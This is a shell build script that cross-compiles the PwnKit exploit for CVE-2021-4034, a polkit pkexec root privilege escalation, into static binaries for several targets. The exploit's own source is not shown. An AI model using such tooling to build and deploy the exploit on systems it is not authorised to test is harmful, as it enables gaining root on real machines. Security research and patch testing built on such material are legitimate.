rm -rf builds
mkdir builds

cat targets | while read COMPILER TARGET; do
    echo "++ BUILD FOR $TARGET"
    tmp_dir=`mktemp -d`

    cp pwnkit.c cve-2021-4034.c $tmp_dir

    docker run --rm -v $tmp_dir:/work muslcc/x86_64:$COMPILER gcc -s -Os -shared -fPIC -Wl,--unresolved-symbols=ignore-all -Wl,-z,now -nostdlib -ffreestanding -fno-builtin -o /work/pwnkit.so /work/pwnkit.c

    xxd -i $tmp_dir/pwnkit.so | sed -r 's/ [^ ]*pwnkit_so/ pwnkit/' > $tmp_dir/pwninc.h
    docker run --rm -v $tmp_dir:/work muslcc/x86_64:$COMPILER gcc -static -s -Os -I/work/ -o /work/cve-2021-4034 /work/cve-2021-4034.c
    cp $tmp_dir/cve-2021-4034 builds/cve-2021-4034_$TARGET

    rm -rf $tmp_dir
done

